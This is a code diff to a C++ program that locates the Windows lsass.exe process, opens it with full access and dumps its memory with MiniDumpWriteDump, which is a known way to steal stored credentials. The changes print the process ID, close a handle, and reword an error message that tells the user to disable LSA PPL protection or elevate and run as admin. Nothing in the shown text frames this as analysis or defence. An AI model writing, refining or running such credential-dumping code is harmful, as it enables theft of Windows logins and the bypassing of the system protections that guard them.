@@ -28,11 +28,12 @@ int main() {
         std::cerr << "Unable to find lsass.exe proc\n";
         return 1;
     }
+    std::cout << "Found lsass.exe: pid=" << pid << "\n";
 
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (hProc == INVALID_HANDLE_VALUE || hProc == 0) {
         std::cerr << "Cannot open lsass.exe: " << GetLastError() << "\n";
-        std::cerr << "Maybe run as admin and disable PPL for lsass / elevate this proc to PPL\n";
+        std::cerr << "Disable PPL for lsass or elevate this proc to PPL, and run as admin\n";
         return 1;
     }
 
@@ -51,6 +52,7 @@ int main() {
         std::cout << "MiniDumpWriteDump error: " << GetLastError() << "\n";
     }
 
+    CloseHandle(hProc);
     CloseHandle(hFile);
     return 0;
 }
